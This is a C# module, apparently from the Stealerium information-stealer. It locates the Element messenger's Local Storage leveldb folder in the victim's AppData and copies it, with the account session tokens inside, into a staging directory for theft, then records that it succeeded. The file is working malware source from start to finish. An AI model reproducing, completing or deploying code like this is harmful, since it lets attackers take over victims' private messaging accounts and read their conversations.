using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers;

internal sealed class Element
{
	private static readonly string ElementPath = Path.Combine(Paths.Appdata, "Element\\Local Storage");

	public static void GetSession(string sSavePath)
	{
		if (!Directory.Exists(ElementPath))
		{
			return;
		}
		string text = Path.Combine(ElementPath, "leveldb");
		if (Directory.Exists(text))
		{
			try
			{
				Filemanager.CopyDirectory(text, sSavePath + "\\leveldb");
			}
			catch
			{
				return;
			}
		}
		Counter.Element = true;
	}
}
